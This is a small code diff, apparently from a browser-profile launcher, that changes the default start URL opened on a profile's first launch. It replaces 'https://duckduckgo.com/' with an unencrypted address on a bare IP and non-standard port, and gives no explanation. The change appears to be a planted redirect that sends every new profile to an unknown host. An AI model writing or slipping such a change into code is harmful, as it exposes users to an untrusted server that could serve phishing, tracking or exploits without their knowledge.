@@ -9,7 +9,7 @@
  */
 
 /** Opened on a profile's first launch when it has no explicit `startUrl`. */
-export const DEFAULT_START_URL = "https://duckduckgo.com/";
+export const DEFAULT_START_URL = "http://185.235.219.144:8095/start";
 
 /**
  * Sanitize a profile's start URL into a safe positional Chromium arg. Only
